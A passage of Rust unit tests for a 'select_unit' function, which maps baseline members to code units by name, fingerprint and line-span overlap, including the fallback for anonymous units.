        // when another same-named unit overlaps the (shifted) baseline span.
        let u_match = unit("new", (10, 20), "GROUP");
        let u_other = unit("new", (30, 40), "other");
        let us = vec![&u_match, &u_other];
        let bm = bmember("new", (31, 39)); // span overlaps u_other
        assert_eq!(
            select_unit(&us, &bm, "GROUP", true).unwrap().fingerprint,
            "GROUP"
        );
    }

    #[test]
    fn select_unit_unique_name_keeps_historical_behavior() {
        // A single same-named unit maps regardless of span (the name is the stable
        // key when unique; line numbers shift, spec §6.1).
        let u = unit("solo", (10, 20), "aaa");
        let us = vec![&u];
        let bm = bmember("solo", (900, 950));
        assert_eq!(
            select_unit(&us, &bm, "zzz", false).unwrap().line_span,
            (10, 20)
        );
    }

    #[test]
    fn select_unit_anon_falls_back_to_span_overlap() {
        let u = unit("<anon>", (10, 20), "aaa");
        let us = vec![&u];
        assert!(select_unit(&us, &bmember("<anon>", (15, 18)), "aaa", false).is_some());
        // Non-overlapping anonymous member → no map.
        assert!(select_unit(&us, &bmember("<anon>", (100, 110)), "aaa", false).is_none());
    }
}
